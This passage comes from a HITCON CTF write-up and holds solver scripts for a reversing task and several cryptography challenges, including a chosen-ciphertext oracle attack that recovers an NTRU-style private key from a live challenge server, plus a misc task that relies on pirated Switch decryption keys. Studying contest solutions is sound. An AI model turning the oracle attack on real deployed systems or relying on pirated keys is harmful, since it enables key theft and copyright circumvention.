Then the function would check if the 27-byte output equals to the Middle Endian numbers `[42232fa, 5060337, 007e704, 01867e7, 6e91514, 24113f2, 1d29707, 6458afc, 481fd47]`.

Now, it's possible to get the flag byte-by-byte with brute-force:
```python=
import string
import copy
s_box = [330, 398, 76, 109, 60, 355, 122, 456, 508, 91, 502, 184, 3, 429, 495, 271, 356, 164, 58, 2, 107, 48, 129, 204, 156, 8, 283, 315, 441, 130, 124, 294, 414, 415, 471, 143, 84, 114, 10, 185, 120, 377, 4, 112, 231, 219, 192, 70, 116, 224, 161, 1, 230, 46, 300, 186, 121, 509, 208, 81, 28, 338, 63, 212, 49, 169, 187, 268, 222, 291, 470, 353, 446, 20, 133, 364, 425, 160, 393, 480, 171, 411, 276, 181, 74, 221, 240, 88, 312, 136, 111, 200, 427, 296, 482, 489, 265, 157, 313, 465, 25, 106, 304, 118, 193, 370, 379, 110, 47, 302, 420, 132, 346, 511, 386, 126, 14, 466, 412, 262, 5, 354, 135, 117, 148, 196, 499, 72, 69, 194, 73, 289, 490, 95, 223, 464, 102, 311, 163, 404, 298, 378, 23, 336, 458, 209, 426, 274, 269, 213, 299, 418, 201, 255, 392, 7, 94, 162, 372, 292, 180, 408, 496, 491, 253, 273, 138, 270, 199, 505, 251, 445, 203, 303, 277, 57, 214, 447, 22, 444, 100, 308, 218, 280, 335, 388, 417, 202, 66, 150, 288, 297, 75, 504, 96, 332, 467, 476, 461, 215, 279, 343, 195, 27, 309, 307, 31, 341, 155, 252, 345, 387, 168, 431, 232, 263, 325, 190, 239, 305, 324, 344, 391, 286, 395, 337, 21, 234, 32, 485, 0, 216, 249, 211, 423, 357, 33, 34, 236, 256, 151, 35, 18, 170, 317, 101, 334, 281, 257, 12, 243, 487, 278, 220, 0, 67, 401, 433, 267, 237, 79, 15, 105, 43, 115, 179, 264, 301, 438, 473, 39, 198, 342, 320, 217, 474, 409, 258, 492, 394, 290, 434, 174, 462, 390, 87, 367, 322, 451, 145, 38, 71, 318, 183, 139, 463, 368, 452, 374, 173, 83, 469, 435, 327, 167, 275, 285, 295, 197, 371, 104, 113, 406, 41, 503, 244, 500, 358, 9, 11, 233, 454, 349, 165, 226, 359, 61, 321, 510, 421, 59, 468, 439, 56, 350, 497, 207, 407, 442, 134, 507, 16, 37, 413, 125, 385, 381, 205, 0, 366, 331, 449, 506, 437, 52, 229, 128, 99, 410, 152, 376, 189, 248, 119, 159, 424, 422, 310, 64, 319, 172, 108, 50, 384, 397, 247, 375, 293, 153, 225, 432, 333, 68, 146, 430, 19, 242, 402, 55, 383, 191, 396, 78, 450, 403, 457, 362, 77, 166, 382, 339, 85, 238, 123, 287, 475, 144, 440, 89, 389, 329, 369, 348, 241, 352, 54, 42, 137, 259, 314, 250, 405, 347, 235, 53, 175, 306, 13, 188, 29, 182, 326, 428, 360, 246, 455, 245, 154, 98, 260, 65, 140, 443, 80, 51, 45, 481, 206, 272, 501, 127, 178, 93, 459, 373, 6, 266, 82, 478, 44, 149, 24, 176, 484, 494, 340, 399, 479, 365, 328, 92, 316, 147, 400, 36, 486, 419, 158, 26, 416, 97, 228, 351, 472, 453, 323, 282, 448, 17, 141, 210, 177, 493, 498, 227, 142, 380, 361, 0, 40, 483, 363, 488, 436, 30, 477, 62, 261, 86, 131, 284, 460]
# the 8-bit byte version of middle endian [42232fa, 5060337, 007e704, 01867e7, 6e91514, 24113f2, 1d29707, 6458afc, 481fd47]
target = [279, 257, 232, 235, 272, 168, 367, 423, 270, 45, 482, 358, 506, 259, 63, 390, 444, 273, 113, 393, 45, 440, 96, 367, 466, 49, 94]
flag = 'hitcon{'
while flag[-1] != '}':
    for t in string.ascii_letters + string.digits + "{_}":
        flag_buf = (flag + t).encode()
        i = 0
        j = 0
        sbox = copy.copy(s_box)
        output = [0] * len(flag_buf)
        for r1 in range(len(flag_buf)):
            i = (sbox[r1] + i)%512
            sbox[r1], sbox[i] = sbox[i], sbox[r1]
            temp = (sbox[i] +  sbox[r1])%512
            r8 = sbox[temp]^flag_buf[r1]
            output[r1] = (r8 + j)%512
            j = output[r1]
        if output == target[:len(output)]:
            print(flag)
            flag += t
            break
print(flag)
#hitcon{6d0fe79f2179175dda}
```


## Crypto

### a little easy rsa

> utaha

Since the private key of RSA is $p$, we have
$$ep \equiv 1 \pmod{(p-1)(q-1)}$$
Therefore,
$$p-1 | e - 1,\, q - 1\nmid e - 1$$
We can recover $p$ (which is the private key) with high probability by calculating
$$\mathsf{gcd}(n, 2^{e-1} - 1)$$
and recover the plaintext.

### still not rsa

> utaha

Inspired by the attack described in section 3.3.2 [here](https://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.578.5423&rep=rep1&type=pdf), if we send $rh$ to decrypt for some $r$, then we can detect if $rg$ has a big coefficient (specifically, has an absolute value greater than 22) by checking if the decryption is 0.

Since $g$ has coefficients in range $[-1, 1]$, if we let $r = 21 + x$, we can detect if there's consecutive $1$s or $-1$s, if there isn't, we can try $21 + x^2$. and so on. Next step, we try value of the form $20 + x^i + x^j$, and so on. We can find the fifteen $1$'s (or fifteen $-1$s) in this step.

Similarly, we can find the other 15 oppposite sign term by sending
$$r = x^{i_1} + \cdots x^{i_{15}} - 7x^t$$
where $i$s are the index we get by the last step, and $t$ is the index we are testing. Checking all possible $t$, we successfully recover $g$, with potential rotation error and sign error (meaning that $gx^k$, $-gx^k$ are also possible $g$ for all $k$).

Getting all possible $g$s, we can find all possible private key $f$ by solving
$$fh = pg \pmod q$$
and decrypt the flag.

```python=
from pwn import *
from Crypto.Cipher import AES
from Crypto.Util.number import bytes_to_long as b2l
from Crypto.Util.number import long_to_bytes as l2b
from tqdm import tqdm
from hashlib import sha256

n, q = 167, 128
p = 3

Zx.<x> = ZZ[]
def convolution(f,g):
    return (f * g) % (x^n-1)

def balancedmod(f,q):
    g = list(((f[i] + q//2) % q) - q//2 for i in range(n))
    return Zx(g)  % (x^n-1)

def randomdpoly(d1, d2):
    result = d1*[1]+d2*[-1]+(n-d1-d2)*[0]
    random.shuffle(result)
    return Zx(result)

def invertmodprime(f,p):
    T = Zx.change_ring(Integers(p)).quotient(x^n-1)
    return Zx(lift(1 / T(f)))

def invertmodpowerof2(f,q):
    assert q.is_power_of(2)
    g = invertmodprime(f,2)
    while True:
        r = balancedmod(convolution(g,f),q)
        if r == 1: return g
        g = balancedmod(convolution(g,2 - r),q)

def encode(val):
    poly = 0
    for i in range(n):
        c = val % q 
        poly += (((c + q//2) % q) - q//2) * (x^i)
        val //= q
    return poly

def decode(poly):
    ret = 0
    for x in list(poly)[::-1]:
        if x < 0:
            x += q
        ret = ret * q + x
    return ret

conn = remote('54.92.57.54', 31337)
iv = bytes.fromhex(conn.recvline().decode('ascii'))
ct = bytes.fromhex(conn.recvline().decode('ascii'))
h = Zx(conn.recvline().strip().decode('ascii'))

GLOBAL_QUERY_COUNT = 0

def query(poly):
    global GLOBAL_QUERY_COUNT
    GLOBAL_QUERY_COUNT += 1
    num = decode(poly)
    assert encode(num) == poly
    conn.sendline(l2b(num).hex())
    return Zx(conn.recvline().strip().decode('ascii'))

R = []
pt = 0
MAGIC = 22
print('### Searching for positive terms')
for i in tqdm(range(1, 16)):
    while True:
        _R = R + [x ** pt] # i terms
        pt += 1
        r = sum(_R) * (MAGIC // i) + (MAGIC % i) # if cannot distribute evenly, put the remainder in the constant coefiicient
        c = balancedmod(convolution(r, h), q)
        if query(c) != 0:
            R = _R
            break

oppositeR = []

print('### Searching for negative terms')
for i in tqdm(range(n)):
    if (x ** i) in R:
        continue
    r = sum(R) - 7 * (x ** i)
    c = balancedmod(convolution(r, h), q)
    if query(c) != 0:
        oppositeR += [-(x ** i)]

assert len(R) == 15
assert len(oppositeR) == 15
R += oppositeR
r = sum(R)
R = [x^(n-1) // term for term in R]
g = sum(R)

debug = balancedmod(convolution(g, r), q)
assert max(abs(x) for x in list(debug)) == 30
# fh = pg (q)

OwO.<y> = QQ[]
RR.<z> = OwO.quotient((y^n - 1) // (y - 1))
tmp = RR(h // (x - 1))^(-1)
hinverse = Zx([int(rationalNumber.numerator()) * pow(int(rationalNumber.denominator()), -1, 128) % 128 for rationalNumber in list(tmp)])

f = balancedmod(convolution(p * g // (x - 1), hinverse), q)

assert balancedmod(convolution(f, h), q) == balancedmod(convolution(p, g), q)

print('### Found a possible secret key f')
print(f)
print('### Bruteforce all possibilities')

def solve(secretkey):
    key = sha256(str(secretkey).encode()).digest()
    pt = AES.new(key, AES.MODE_CBC, iv).decrypt(ct)
    if b'hitcon' in pt:
        print(pt)

step = (x ^ n - 1) // (x - 1)

for i in tqdm(range(128)):
    for j in range(128):
        newf = balancedmod((f + step * (i * x + j)) % (x^n-1), q)
        assert balancedmod(convolution(newf, h), q) == balancedmod(convolution(p, g), q)
        if max([abs(x) for x in list(newf)]) >= 2:
            continue

        for k in range(128):
            OwO = balancedmod(convolution(newf, (x ** k)), q)
            solve(OwO)
            solve(-OwO)

```

### so easy rsa
The basic idea is to enumerate the amount of Next() operations from p to q. Q can be written in the form of 
$$q=A^n\times p+B\times \Sigma^{n-1}_{k=0}A^k$$
, which is a linear function of p.

As a result, we can solve p by the quadratic equation $p\times (A^n\times p+B\times \Sigma^{n-1}_{k=0}A^k)=n$.

```python=
from tqdm import trange
n = 198148795890507031730221728469492521085435050254010422245429012501864312776356522213014006175424179860455397661479243825590470750385249479224738397071326661046694312629376866307803789411244554424360122317688081850938387121934893846964467922503328604784935624075688440234885261073350247892064806120096887751
M = 1244793456976456877170839265783035368354692819005211513409129011314633866460250237897970818451591728769403864292158494516440464466254909969383897236264921
A = 1677936292368545917814039483235622978551357499172411081065325777729488793550136568309923513362117687939170753313352485633354858207097035878077942534451467
B = 5687468800624594128838903842767411040727750916115472185196475570099217560998907467291416768835644005325105434981167565207313702286530912332233402467314947
enc = 48071438195829770851852911364054237976158406255022684617769223046035836237425012457131162001786019505606941050117178190535720928339364199078329207393922570246678871062386142183424414041935978305046280399687623437942986302690599232729065536417757505209285175593543234585659130582659013242346666628394528555

r = Zmod(M)
a = 1
b = 0
for i in trange(100000):
    a = (a * A) % M
    b = ((b * A) + B) % M
    sqrt_disc = (r(b) ^ 2 + 4 * r(n) * r(a)).sqrt()
    p1 = (-r(b) + sqrt_disc) / r(2) / r(a)
    p2 = (-r(b) - sqrt_disc) / r(2) / r(a)
    try:
        p1 = int(p1)
        if n % p1 == 0:
            p, q = p1, (a * p1 + b) % M
            print(f"p = {p}\nq = {q}")
            break
        p2 = int(p2)
        if n % p2 == 0:
            p, q = p2, (a * p2 + b) % M
            print(f"p = {p}\nq = {q}")
            break
    except ValueError:
        continue

phi = (p-1) * (q-1)
d = Zmod(phi)(65537) ^ -1

print(int(pow(enc, d, n)).to_bytes(127, byteorder="big").replace(b"\x00", b""))

# hitcon{so_weak_randomnessssss}
```

### magic rsa
```python
from hashlib import *

magic = 10761352180480306817530662373929017204116
print(hex(magic))
nb = magic.factor()[-1][0].nbits()
print(nb)
if nb < 52:
    p = magic << (31*8)
    print("N =",p)
    o = euler_phi(p)
    for i in range(1,p,2):
        if gcd(i,p) != 1:
            continue
        try:
            num1 = i
            data = num1.to_bytes((num1.bit_length()-1)//8+1,byteorder='big')
            num2 = int.from_bytes(sha384(data).digest(),byteorder='big')
            if(num2 >= p):
                continue
            e = discrete_log(Mod(num2,p),Mod(num1,p))
            print(num1)
            print("data = ",data.hex())
            print("e =",e)
            break
        except:
            continue
```


### magic dlog
```python
import multiprocessing as mp
import time
import queue
import os
import hashlib
from telnetlib import Telnet


def worker(x, retval):
    fac = factor(x, proof=False)
    retval.put(fac)

def run(x, timeout=1):
    retval = mp.Queue(1)
    proc = mp.Process(target=worker, args=(x, retval))
    proc.start()
    ret = None
    try:
        ret = retval.get(timeout=timeout)
    except queue.Empty:
        proc.kill()
    proc.join()
    while retval.qsize():
        ret = retval.get()
    return ret


r = None
LEN = 17
while True:
    if r is not None:
        r.close()
    r = Telnet('35.72.139.70', int(31338))
    r.read_until(b'Magic: ')
    magic = bytes.fromhex(r.read_until(b'\n').decode())
    print(magic.hex())

    magic = int.from_bytes(magic, 'big')
    fac = run(magic)
    N = (magic << (384 - 17 * 8)) + 1
    print(N)
    if fac is None:
        continue
    nb = fac[-1][0].nbits()
    print(nb, fac)
    if nb >= 52:
        continue
    if N.is_prime():
        break

r.write(f'{N}\n'.encode())

print("N =", N)
o = euler_phi(N)
print(factor(N-1))
for i in range(1, N, 2):
    if gcd(i, N) != 1:
        continue
    try:
        num1 = i
        data = num1.to_bytes((num1.bit_length()-1)//8+1, byteorder='big')
        num2 = int.from_bytes(hashlib.sha384(data).digest(), byteorder='big')
        if(num2 >= N):
            continue
        print('go', num1, num2)
        e = discrete_log(Mod(num2, N), Mod(num1, N))
        print(num1)
        print("data = ", data.hex())
        print("e =", e)
        r.write(f'{e}\n'.encode())
        r.write(f'{data.hex()}\n'.encode())
        r.interact()
        break
    except ValueError:
        continue
```

## Misc

### baba is misc

Identify that the file is pfs0 archive of NCA files, extract the encrypted NCAs, and use pirated prod.key to decrypt those.

Then write a simple script to filter out levels that are modified

```python=
import subprocess
for i in range(314):
    if '\nname=' in subprocess.getoutput(f'tail -n 5 {i}level.ld'):
        print(i)
```

Finally open each level to retrieve flag
